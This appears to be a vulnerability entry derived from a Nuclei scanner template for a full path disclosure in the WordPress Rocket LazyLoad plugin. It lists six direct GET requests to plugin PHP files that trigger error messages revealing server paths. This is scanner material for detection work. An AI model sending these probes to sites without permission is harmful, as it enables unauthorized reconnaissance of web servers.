# Vulnerability: WordPress LazyLoad Plugin - Full Path Disclosure
**Classification:** WP
**Source:** Nuclei Template (`wordpress-rocket-lazy-load-fpd.yaml`)

## Description
WordPress Plugin LazyLoad files are publicly accessible without ABSPATH protection, exposing sensitive server path information through PHP error messages when accessed directly.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/rocket-lazy-load/src/Subscriber/AdminPageSubscriber.php
GET {{BaseURL}}/wp-content/plugins/rocket-lazy-load/src/Subscriber/LazyloadSubscriber.php
GET {{BaseURL}}/wp-content/plugins/rocket-lazy-load/src/ServiceProvider/AdminServiceProvider.php
GET {{BaseURL}}/wp-content/plugins/rocket-lazy-load/src/ServiceProvider/ImagifyNoticeServiceProvider.php
GET {{BaseURL}}/wp-content/plugins/rocket-lazy-load/src/ServiceProvider/LazyloadServiceProvider.php
GET {{BaseURL}}/wp-content/plugins/rocket-lazy-load/src/ServiceProvider/SubscribersServiceProvider.php
```

